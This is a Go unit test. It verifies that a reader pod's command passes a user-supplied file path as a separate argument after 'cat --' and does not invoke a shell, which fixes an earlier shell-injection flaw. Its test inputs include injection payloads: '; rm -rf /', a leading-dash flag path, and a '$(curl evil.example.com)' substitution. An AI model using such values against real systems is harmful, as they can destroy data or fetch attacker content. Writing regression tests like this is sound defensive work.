/*
Copyright 2026.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package cli

import "testing"

// Earlier versions built the reader pod's Command via
// `sh -c "cat %q"`, which was vulnerable to shell injection when the
// user-supplied --file path contained command substitution or other
// shell metacharacters. The fix is to skip the shell entirely and pass
// the path as a distinct argv element. These tests lock that contract
// in.
func TestNewReaderPod_CommandAvoidsShell(t *testing.T) {
	cases := []struct {
		name, filePath string
	}{
		{"plain path", "/workspace/.paddock/runs/r1/events.jsonl"},
		{"path with shell metacharacters", "/workspace/foo; rm -rf /"},
		{"path starting with dash", "-rf /etc"},
		{"path with command substitution", `/workspace/$(curl evil.example.com)`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			pod := newReaderPod("p", "ns", "pvc", "busybox:1.37", tc.filePath)
			if len(pod.Spec.Containers) != 1 {
				t.Fatalf("expected 1 container, got %d", len(pod.Spec.Containers))
			}
			cmd := pod.Spec.Containers[0].Command
			if len(cmd) != 3 {
				t.Fatalf("expected 3-element Command (cat -- <path>); got %#v", cmd)
			}
			if cmd[0] != "cat" {
				t.Errorf("Command[0] = %q, want \"cat\" — a shell must not be invoked", cmd[0])
			}
			if cmd[1] != "--" {
				t.Errorf("Command[1] = %q, want \"--\" — missing flag terminator lets leading-dash paths be interpreted as flags", cmd[1])
			}
			if cmd[2] != tc.filePath {
				t.Errorf("Command[2] = %q, want %q — path must be a distinct argv element", cmd[2], tc.filePath)
			}
		})
	}
}
